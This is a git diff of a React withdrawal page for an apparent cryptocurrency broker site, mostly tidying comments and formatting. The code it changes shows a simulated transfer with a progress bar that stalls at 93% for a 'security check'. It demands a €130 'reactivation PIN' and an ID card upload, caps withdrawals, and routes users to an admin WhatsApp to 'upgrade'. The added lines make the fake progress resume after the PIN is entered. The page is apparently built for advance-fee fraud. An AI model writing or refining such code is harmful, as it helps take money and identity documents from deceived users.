@@ -16,7 +16,7 @@ import { ADMIN_WHATSAPP } from '../data/mockData';
 import { country } from '../data/countries';
 import API from '../utils/axios';
 
-// ✅ WITHDRAWAL LIMIT – users can withdraw up to this amount
+// ✅ WITHDRAWAL LIMIT
 const WITHDRAWAL_LIMIT = 5000;
 // ✅ SECURITY TRACE THRESHOLD – amounts above this require local currency conversion
 const TRACE_THRESHOLD = 1000;
@@ -49,10 +49,10 @@ const Withdraw = () => {
   const [idError, setIdError] = useState('');
   const idInputRef = useRef(null);
 
-  // ✅ Upgrade limit modal state
+  // Upgrade limit modal
   const [showUpgradeModal, setShowUpgradeModal] = useState(false);
 
-  // ✅ NEW: Currency conversion modal state
+  // Currency conversion modal
   const [showCurrencyModal, setShowCurrencyModal] = useState(false);
   const [selectedCountry, setSelectedCountry] = useState(null);
   const [countrySearch, setCountrySearch] = useState('');
@@ -65,6 +65,7 @@ const Withdraw = () => {
 
   const currencySymbol = getCurrencySymbol(user?.currency);
 
+  // ─── Fetch KYC status ─────────────────────────────────────────
   useEffect(() => {
     const checkKYC = async () => {
       try {
@@ -80,6 +81,7 @@ const Withdraw = () => {
     checkKYC();
   }, []);
 
+  // ─── Fetch wallet balance ─────────────────────────────────────
   useEffect(() => {
     const fetchData = async () => {
       try {
@@ -92,14 +94,16 @@ const Withdraw = () => {
     fetchData();
   }, []);
 
+  // ─── Cleanup on unmount ───────────────────────────────────────
   useEffect(() => {
     return () => {
       if (progressInterval.current) clearInterval(progressInterval.current);
     };
   }, []);
 
-  // ✅ Progress effect with pause at 93% for security check
+  // ─── Progress interval effect ─────────────────────────────────
   useEffect(() => {
+    // If modal is closed, clear interval
     if (!showTransferModal) {
       if (progressInterval.current) {
         clearInterval(progressInterval.current);
@@ -108,8 +112,10 @@ const Withdraw = () => {
       return;
     }
 
-    if (transferStatus === 'complete' || transferStatus === 'failed') return;
+    // Don't run if failed or complete
+    if (transferStatus === 'failed' || transferStatus === 'complete') return;
 
+    // Start progress from current value
     let progress = transferProgress;
 
     progressInterval.current = setInterval(() => {
@@ -124,7 +130,7 @@ const Withdraw = () => {
         return;
       }
 
-      // ✅ NEW: Pause at 93% if retry AND amount > threshold AND not yet confirmed
+      // ✅ Pause at 93% for security check (only if amount > threshold and not confirmed)
       if (
         progress >= 93 &&
         isRetry &&
@@ -167,13 +173,15 @@ const Withdraw = () => {
     { id: 'TRX', name: 'Tron', icon: FaBitcoin, color: 'text-red-500' },
   ];
 
-  // ✅ Filter countries for search
-  const filteredCountries = country.filter((c) =>
-    c.name.toLowerCase().includes(countrySearch.toLowerCase()) ||
-    c.currency.toLowerCase().includes(countrySearch.toLowerCase()) ||
-    c.code.toLowerCase().includes(countrySearch.toLowerCase())
+  // Filter countries for search
+  const filteredCountries = country.filter(
+    (c) =>
+      c.name.toLowerCase().includes(countrySearch.toLowerCase()) ||
+      c.currency.toLowerCase().includes(countrySearch.toLowerCase()) ||
+      c.code.toLowerCase().includes(countrySearch.toLowerCase())
   );
 
+  // ─── Submit handler ───────────────────────────────────────────
   const handleSubmit = (e) => {
     e.preventDefault();
 
@@ -204,9 +212,13 @@ const Withdraw = () => {
       return;
     }
 
+    // ✅ Reset all transfer-related state for a fresh run
     setIsRetry(false);
     setCurrencyConfirmed(false);
     setSelectedCountry(null);
+    setTransferStatus('pending');
+    setTransferProgress(0);
+
     proceedWithdrawal(amountNum);
   };
 
@@ -232,7 +244,7 @@ const Withdraw = () => {
         metadata: {
           cryptoCurrency: crypto,
           walletAddress: address,
-          // ✅ Include local currency info if converted
+          // Include local currency info if converted
           ...(currencyConfirmed &&
             selectedCountry && {
               convertedToLocal: true,
@@ -249,6 +261,7 @@ const Withdraw = () => {
     }
   };
 
+  // ─── Retry handler (from failed transfer) ─────────────────────
   const handleRetry = () => {
     setShowTransferModal(false);
     setShowReactivationModal(true);
@@ -281,6 +294,7 @@ const Withdraw = () => {
     if (idInputRef.current) idInputRef.current.value = '';
   };
 
+  // ─── Verify reactivation PIN ──────────────────────────────────
   const handleVerifyPin = () => {
     if (!idCardFile) {
       setIdError('Please upload your ID card.');
@@ -298,12 +312,15 @@ const Withdraw = () => {
 
     setTimeout(() => {
       if (reactivationPin.trim() === REACTIVATION_PIN) {
+        // ✅ Reset state so progress resumes correctly
         setShowReactivationModal(false);
         setReactivationPin('');
         setPinError('');
         setIdCardFile(null);
         setIsVerifyingPin(false);
         setIsRetry(true);
+        setTransferStatus('pending');   // ← critical
+        setTransferProgress(45);         // ← resume from 45%
         setShowTransferModal(true);
         toast.success('Account reactivated. Completing transfer...');
       } else {
@@ -314,7 +331,7 @@ const Withdraw = () => {
     }, 800);
   };
 
-  // ✅ NEW: Handle currency conversion confirmation
+  // ─── Confirm currency conversion ──────────────────────────────
   const handleConfirmConversion = () => {
     if (!selectedCountry) {
       setCountryError('Please select your country.');
@@ -323,10 +340,9 @@ const Withdraw = () => {
     setCountryError('');
     setIsConverting(true);
 
-    // Simulate a short conversion process
     setTimeout(() => {
       setIsConverting(false);
-      setCurrencyConfirmed(true);
+      setCurrencyConfirmed(true); // triggers effect re-run and resumes progress
       setShowCurrencyModal(false);
       toast.success(
         `Balance will be converted to ${selectedCountry.currency}. Resuming transfer...`
@@ -348,7 +364,7 @@ const Withdraw = () => {
   const isKycVerified = kycStatus === 'verified';
   const amountNum = parseFloat(amount) || 0;
 
-  // WhatsApp support link for upgrade modal
+  // WhatsApp support link
   const whatsappUpgradeLink = `https://wa.me/${ADMIN_WHATSAPP}?text=${encodeURIComponent(
     `Hello, I would like to upgrade my withdrawal limit. My current request of $${amountNum.toLocaleString()} exceeds the limit of $${WITHDRAWAL_LIMIT.toLocaleString()}.`
   )}`;
@@ -377,7 +393,8 @@ const Withdraw = () => {
           <div className="mb-4 p-3 bg-blue-500/10 border border-blue-500/30 rounded-lg flex items-center gap-3">
             <FaInfoCircle className="text-blue-500 text-sm flex-shrink-0" />
             <p className="text-blue-400 text-sm">
-              Your withdrawal limit is <strong className="text-white">{formatCurrency(WITHDRAWAL_LIMIT)}</strong> per request.
+              Your withdrawal limit is{' '}
+              <strong className="text-white">{formatCurrency(WITHDRAWAL_LIMIT)}</strong> per request.
             </p>
           </div>
 
@@ -394,7 +411,9 @@ const Withdraw = () => {
 
           <form onSubmit={handleSubmit} className="space-y-6">
             <div>
-              <label className="block text-slate-300 text-sm font-medium mb-2">Select Cryptocurrency</label>
+              <label className="block text-slate-300 text-sm font-medium mb-2">
+                Select Cryptocurrency
+              </label>
               <div className="grid grid-cols-3 sm:grid-cols-5 gap-2">
                 {cryptos.map((c) => (
                   <button
@@ -415,7 +434,9 @@ const Withdraw = () => {
             </div>
 
             <div>
-              <label className="block text-slate-300 text-sm font-medium mb-2">Amount ({user?.currency || 'USD'})</label>
+              <label className="block text-slate-300 text-sm font-medium mb-2">
+                Amount ({user?.currency || 'USD'})
+              </label>
               <div className="relative">
                 <span className="absolute left-3 top-1/2 transform -translate-y-1/2 text-slate-400">
                   {currencySymbol}
@@ -444,7 +465,9 @@ const Withdraw = () => {
             </div>
 
             <div>
-              <label className="block text-slate-300 text-sm font-medium mb-2">Wallet Address</label>
+              <label className="block text-slate-300 text-sm font-medium mb-2">
+                Wallet Address
+              </label>
               <input
                 type="text"
                 value={address}
@@ -471,7 +494,7 @@ const Withdraw = () => {
         </motion.div>
       </div>
 
-      {/* ✅ UPGRADE LIMIT MODAL */}
+      {/* ═══════════════ UPGRADE LIMIT MODAL ═══════════════ */}
       <AnimatePresence>
         {showUpgradeModal && (
           <motion.div
@@ -498,16 +521,16 @@ const Withdraw = () => {
 
               <p className="text-sm text-slate-400 text-center mb-4">
                 Your withdrawal request of{' '}
-                <strong className="text-white">{formatCurrency(amountNum)}</strong>{' '}
-                exceeds your current limit of{' '}
+                <strong className="text-white">{formatCurrency(amountNum)}</strong> exceeds your
+                current limit of{' '}
                 <strong className="text-white">{formatCurrency(WITHDRAWAL_LIMIT)}</strong>.
               </p>
 
               <div className="mb-4 p-3 bg-orange-500/10 border border-orange-500/30 rounded-lg flex items-start gap-3">
                 <FaInfoCircle className="text-orange-400 text-sm mt-0.5 flex-shrink-0" />
                 <p className="text-orange-300 text-xs leading-relaxed">
-                  To upgrade your withdrawal limit, please contact our support team. They will guide
-                  you through the account upgrade process.
+                  To upgrade your withdrawal limit, please contact our support team. They will
+                  guide you through the account upgrade process.
                 </p>
               </div>
 
@@ -538,7 +561,7 @@ const Withdraw = () => {
         )}
       </AnimatePresence>
 
-      {/* TRANSFER SIMULATION MODAL */}
+      {/* ═══════════════ TRANSFER SIMULATION MODAL ═══════════════ */}
       <AnimatePresence>
         {showTransferModal && (
           <motion.div
@@ -578,8 +601,10 @@ const Withdraw = () => {
               </h3>
 
               <p className="text-sm text-slate-400 mb-4">
-                {transferStatus === 'pending' && 'Moving funds from broker wallet to your destination wallet.'}
-                {transferStatus === 'failed' && 'The transfer could not be completed. Please try again.'}
+                {transferStatus === 'pending' &&
+                  'Moving funds from broker wallet to your destination wallet.'}
+                {transferStatus === 'failed' &&
+                  'The transfer could not be completed. Please try again.'}
                 {transferStatus === 'complete' && 'Your funds have been sent successfully!'}
               </p>
 
@@ -619,7 +644,7 @@ const Withdraw = () => {
         )}
       </AnimatePresence>
 
-      {/* ✅ NEW: CURRENCY CONVERSION / SECURITY TRACE MODAL */}
+      {/* ═══════════════ CURRENCY CONVERSION / SECURITY MODAL ═══════════════ */}
       <AnimatePresence>
         {showCurrencyModal && (
           <motion.div
@@ -646,9 +671,9 @@ const Withdraw = () => {
 
               <p className="text-sm text-slate-400 text-center mb-4">
                 Your withdrawal of{' '}
-                <strong className="text-white">{formatCurrency(amountNum)}</strong>{' '}
-                exceeds <strong className="text-white">{formatCurrency(TRACE_THRESHOLD)}</strong>.
-                To ensure traceability and prevent security risks, please confirm your local currency.
+                <strong className="text-white">{formatCurrency(amountNum)}</strong> exceeds{' '}
+                <strong className="text-white">{formatCurrency(TRACE_THRESHOLD)}</strong>. To
+                ensure traceability and prevent security risks, please confirm your local currency.
               </p>
 
               <div className="mb-4 p-3 bg-blue-500/10 border border-blue-500/30 rounded-lg flex items-start gap-3">
@@ -709,7 +734,9 @@ const Withdraw = () => {
                   <div className="space-y-1 text-sm">
                     <div className="flex justify-between">
                       <span className="text-slate-400">From:</span>
-                      <span className="text-white font-medium">{formatCurrency(amountNum)} USD</span>
+                      <span className="text-white font-medium">
+                        {formatCurrency(amountNum)} USD
+                      </span>
                     </div>
                     <div className="flex justify-between">
                       <span className="text-slate-400">To:</span>
@@ -761,7 +788,7 @@ const Withdraw = () => {
         )}
       </AnimatePresence>
 
-      {/* REACTIVATION MODAL */}
+      {/* ═══════════════ REACTIVATION MODAL ═══════════════ */}
       <AnimatePresence>
         {showReactivationModal && (
           <motion.div
@@ -789,10 +816,9 @@ const Withdraw = () => {
               <div className="mb-4 p-3 bg-orange-500/10 border border-orange-500/30 rounded-lg flex items-start gap-3">
                 <FaInfoCircle className="text-orange-400 text-sm mt-0.5 flex-shrink-0" />
                 <p className="text-orange-300 text-xs leading-relaxed">
-                  For security, please upload your ID card and enter your reactivation PIN.
-                  A reactivation PIN costs{' '}
-                  <strong className="text-orange-200">€130.00</strong> and must be purchased
-                  before completing this withdrawal.
+                  For security, please upload your ID card and enter your reactivation PIN. A
+                  reactivation PIN costs <strong className="text-orange-200">€130.00</strong> and
+                  must be purchased before completing this withdrawal.
                 </p>
               </div>
 
@@ -836,9 +862,7 @@ const Withdraw = () => {
                     </button>
                   </div>
                 )}
-                {idError && (
-                  <p className="text-red-400 text-xs mt-2">{idError}</p>
-                )}
+                {idError && <p className="text-red-400 text-xs mt-2">{idError}</p>}
               </div>
 
               <div className="mb-4">
@@ -858,9 +882,7 @@ const Withdraw = () => {
                     } rounded-lg pl-10 pr-4 py-3 text-white placeholder-slate-500 focus:outline-none focus:border-blue-500 transition`}
                   />
                 </div>
-                {pinError && (
-                  <p className="text-red-400 text-xs mt-2">{pinError}</p>
-                )}
+                {pinError && <p className="text-red-400 text-xs mt-2">{pinError}</p>}
               </div>
 
               <div className="flex gap-3">
